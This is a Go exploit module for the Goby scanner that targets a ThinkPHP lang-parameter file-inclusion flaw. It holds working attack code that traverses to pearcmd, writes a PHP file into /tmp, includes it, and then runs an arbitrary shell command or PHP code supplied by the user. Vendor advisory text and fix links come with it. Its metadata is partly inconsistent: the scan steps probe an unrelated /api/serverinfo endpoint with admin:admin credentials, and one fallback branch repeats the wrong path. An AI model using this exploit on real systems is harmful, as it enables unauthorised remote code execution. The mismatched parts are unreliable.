package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Description": "<p>ThinkPHP is an open source, PHP-based lightweight web application development framework.</p><p>If the Thinkphp program has the multi-language function enabled, parameters can be passed in through get, header, cookie, etc. to achieve directory traversal and file inclusion, and command execution can be realized by including specific files.</p>",
    "Product": "ThinkPHP",
    "Homepage": "http://www.thinkphp.cn",
    "DisclosureDate": "2021-12-09",
    "Author": "992271865@qq.com",
    "FofaQuery": "header=\"think_lang\" || banner=\"think_lang\"",
    "GobyQuery": "header=\"think_lang\" || banner=\"think_lang\"",
    "Level": "2",
    "Impact": "<p>If the Thinkphp program has the multi-language function enabled, parameters can be passed in through get, header, cookie, etc. to achieve directory traversal and file inclusion, and command execution can be realized by including specific files.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/top-think/framework/releases/tag/v6.0.14\">https://github.com/top-think/framework/releases/tag/v6.0.14</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
    "Translation": {
        "CN": {
            "Name": "ThinkPHP 开发框架 index.php 文件 lang 参数命令执行漏洞",
            "Product": "ThinkPHP",
            "Description": "<p>ThinkPHP 是一套开源的、基于PHP的轻量级Web应用开发框架。</p><p>Thinkphp 程序若开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越和文件包含，包含特定文件即可实现命令执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/top-think/framework/releases/tag/v6.0.14\">https://github.com/top-think/framework/releases/tag/v6.0.14</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Thinkphp 程序若开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越和文件包含，包含特定文件即可实现命令执行。<br></p>",
            "VulType": [
                "命令执行",
                "文件包含"
            ],
            "Tags": [
                "命令执行",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "ThinkPHP index.php lang command execution vulnerability",
            "Product": "ThinkPHP",
            "Description": "<p>ThinkPHP is an open source, PHP-based lightweight web application development framework.</p><p>If the Thinkphp program has the multi-language function enabled, parameters can be passed in through get, header, cookie, etc. to achieve directory traversal and file inclusion, and command execution can be realized by including specific files.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://github.com/top-think/framework/releases/tag/v6.0.14\">https://github.com/top-think/framework/releases/tag/v6.0.14</a></p><p>1. Set access policies through security devices such as firewalls, and set whitelist access.</p><p>2. If it is not necessary, the public network is prohibited from accessing the system.</p>",
            "Impact": "<p>If the Thinkphp program has the multi-language function enabled, parameters can be passed in through get, header, cookie, etc. to achieve directory traversal and file inclusion, and command execution can be realized by including specific files.<br></p>",
            "VulType": [
                "Command Execution",
                "File Inclusion"
            ],
            "Tags": [
                "Command Execution",
                "File Inclusion"
            ]
        }
    },
    "References": [
        "https://fofa.so/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpcore",
            "type": "input",
            "value": "<?=phpinfo()?>",
            "show": "AttackType=phpcore"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "AttackType=cmd"
        },
        {
            "name": "AttackType",
            "type": "select",
            "value": "phpcore,cmd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/serverinfo",
                "follow_redirect": false,
                "header": {
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "version",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "bind_port",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "client_counts",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "File Inclusion"
    ],
    "VulType": [
        "Command Execution",
        "File Inclusion"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Name": "ThinkPHP index.php lang command execution vulnerability",
    "PocId": "10691"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();@unlink(__FILE__)?>+/tmp/hello.php")
			cfg.FollowRedirect = false
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "/<?=phpinfo();@unlink(__FILE__)?>") && strings.Contains(resp.RawBody, "CONFIGURATION") && strings.Contains(resp.RawBody, "/tmp/hello.php") {
				cfg1 := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				if resp1, err1 := httpclient.DoHttpRequest(u, cfg1); err1 == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "#PEAR_Config") && strings.Contains(resp1.RawBody, "PHP Version") && strings.Contains(resp1.RawBody, "PHP API") {
					return true
				}
			} else {
				cfg := httpclient.NewGetRequestConfig("/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=phpinfo();@unlink(__FILE__)?>+/tmp/hello.php")
				cfg.FollowRedirect = false
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "/<?=phpinfo();@unlink(__FILE__)?>") && strings.Contains(resp.RawBody, "CONFIGURATION") && strings.Contains(resp.RawBody, "/tmp/hello.php") {
					cfg1 := httpclient.NewGetRequestConfig("/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp1, err1 := httpclient.DoHttpRequest(u, cfg1); err1 == nil && resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "#PEAR_Config") && strings.Contains(resp1.RawBody, "PHP Version") && strings.Contains(resp1.RawBody, "PHP API") {
						return true
					}
				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "cmd" {
				cmd := ss.Params["cmd"].(string)
				cfg := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=`" + cmd + "`;@unlink(__FILE__)?>'+/tmp/hello.php")
				cfg.FollowRedirect = false
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "CONFIGURATION") {
					cfg1 := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err1 == nil && resp1.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp1.RawBody
						return expResult
					}
				} else {
					cfg := httpclient.NewGetRequestConfig("/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/<?=`" + cmd + "`;@unlink(__FILE__)?>'+/tmp/hello.php")
					cfg.FollowRedirect = false
					cfg.VerifyTls = false
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "CONFIGURATION") {
						cfg1 := httpclient.NewGetRequestConfig("/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
						cfg1.VerifyTls = false
						cfg1.FollowRedirect = false
						if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err1 == nil && resp1.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = resp1.RawBody
							return expResult
						}
					}
				}

			} else if ss.Params["AttackType"].(string) == "phpcore" {
				phpcore := ss.Params["phpcore"].(string)
				cfg := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/" + phpcore + "+/tmp/hello.php")
				cfg.FollowRedirect = false
				cfg.VerifyTls = false
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "CONFIGURATION") {
					cfg1 := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err1 == nil && resp1.StatusCode == 200 {
						expResult.Success = true
						expResult.Output = resp1.RawBody
						return expResult
					}
				} else {
					cfg := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/" + phpcore + "+/tmp/hello.php")
					cfg.FollowRedirect = false
					cfg.VerifyTls = false
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "CONFIGURATION") {
						cfg1 := httpclient.NewGetRequestConfig("/public/index.php?lang=../../../../../../../../../../../../../../../tmp/hello")
						cfg1.VerifyTls = false
						cfg1.FollowRedirect = false
						if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err1 == nil && resp1.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = resp1.RawBody
							return expResult
						}
					}
				}
			}

			return expResult
		},
	))
}
